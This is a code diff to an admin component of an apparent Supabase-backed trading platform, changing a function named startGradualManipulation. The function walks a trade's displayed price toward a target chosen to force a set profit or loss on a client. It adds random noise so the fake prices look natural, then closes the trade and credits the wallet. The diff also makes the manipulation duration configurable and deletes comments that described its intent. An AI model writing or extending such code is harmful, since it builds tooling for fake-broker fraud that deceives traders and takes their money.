@@ -108,19 +108,17 @@ const AdminTrades = () => {
       : entry * (1 - ratio);
   };
 
-  const startGradualManipulation = async (trade: any, forcedPnl: number) => {
+  const startGradualManipulation = async (trade: any, forcedPnl: number, totalDurationSec: number) => {
     const targetPrice = calcTargetPrice(trade, forcedPnl);
     const symbol = trade.assets?.symbol;
     const currentMarketPrice = livePrices[symbol] || Number(trade.entry_price);
-    const steps = 20;
-    const intervalMs = 3000; // 3s per step = 60s total
+    const steps = Math.max(Math.round(totalDurationSec / 3), 4);
+    const intervalMs = (totalDurationSec * 1000) / steps;
     const priceStep = (targetPrice - currentMarketPrice) / steps;
     let step = 0;
 
     setManipulating(prev => ({ ...prev, [trade.id]: true }));
 
-    // CRITICAL: Immediately store the target P&L on the trade so if the client
-    // closes during manipulation, the correct P&L is preserved
     await supabase.from("trades").update({ 
       current_price: currentMarketPrice,
       pnl: forcedPnl,
@@ -128,7 +126,6 @@ const AdminTrades = () => {
 
     const timer = setInterval(async () => {
       step++;
-      // Add small random noise to make it look natural
       const noise = (Math.random() - 0.5) * Math.abs(priceStep) * 0.3;
       const newPrice = currentMarketPrice + priceStep * step + (step < steps ? noise : 0);
       const finalPrice = step >= steps ? targetPrice : +newPrice.toFixed(newPrice < 1 ? 6 : 2);
@@ -138,19 +135,16 @@ const AdminTrades = () => {
       if (step >= steps) {
         clearInterval(timer);
 
-        // Check if client already closed the trade during manipulation
         const { data: currentTrade } = await supabase
           .from("trades").select("status").eq("id", trade.id).maybeSingle();
         
         if (currentTrade?.status === "closed") {
-          // Client already closed — trade has correct P&L from pnl field
           setManipulating(prev => ({ ...prev, [trade.id]: false }));
           toast.success(`Manipulation complete — client already closed with target P&L`);
           fetchTrades();
           return;
         }
 
-        // Close the trade with target P&L
         await supabase.from("trades").update({
           status: "closed",
           closed_at: new Date().toISOString(),
@@ -158,7 +152,6 @@ const AdminTrades = () => {
           current_price: targetPrice,
         }).eq("id", trade.id);
 
-        // Credit wallet
         const { data: wallet } = await supabase
           .from("wallets").select("id, balance")
           .eq("user_id", trade.user_id).eq("currency", "EUR").maybeSingle();
